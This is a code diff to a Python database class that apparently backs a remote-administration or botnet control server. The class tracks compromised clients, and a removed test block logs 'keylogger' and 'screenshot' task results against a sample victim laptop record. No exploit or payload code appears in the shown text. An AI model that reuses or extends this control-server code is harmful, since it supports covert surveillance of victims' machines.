@@ -10,7 +10,6 @@ from __future__ import print_function
 import os
 import json
 import time
-import Queue
 import random
 import hashlib
 import logging
@@ -48,11 +47,10 @@ class Database(mysql.connector.MySQLConnection):
         """
         super(Database, self).__init__(**kwargs)
         self.config(**kwargs)
-        self.logger = util.logger()
-        self.tasks  = {}
+        self.logger = util.tasklogger()
         self._debug = debug
+        self._tasks = [os.path.splitext(_)[0] for _ in os.listdir('modules')]
         self._query = self.cursor(dictionary=True)
-        self._queue = Queue.Queue()
         self._color = util.color()
         self._setup(setup)
 
@@ -309,13 +307,4 @@ class Database(mysql.connector.MySQLConnection):
             util.debug("{} error: {}".format(self.handle_task.func_name, str(e)))
 
 
-if __name__ == '__main__':
-    colorama.init()
-    d = Database()
-    client = {"public_ip": "132.99.245.10", "local_ip": "192.168.1.2", "mac_address": "4D:10:CC:22:09:8D", "platform": "win32", "device": "toms laptop", "username": "tom", "administrator": False, "architecture": 64}
-    info,item = d.handle_client(client)
-    d.handle_task({"client": hashlib.md5(client['public_ip'] + client['mac_address']).hexdigest(), "task": "keylogger", "result": "https://pastebin.com/4RcdSls"})
-    d.handle_task({"client": hashlib.md5(client['public_ip'] + client['mac_address']).hexdigest(), "task": "screenshot", "result": "https://i.imgur.com/09FcsdTn"})
-    d.get_clients(verbose=True, display=True)
-    d.update_client_status(4, 0)
                 
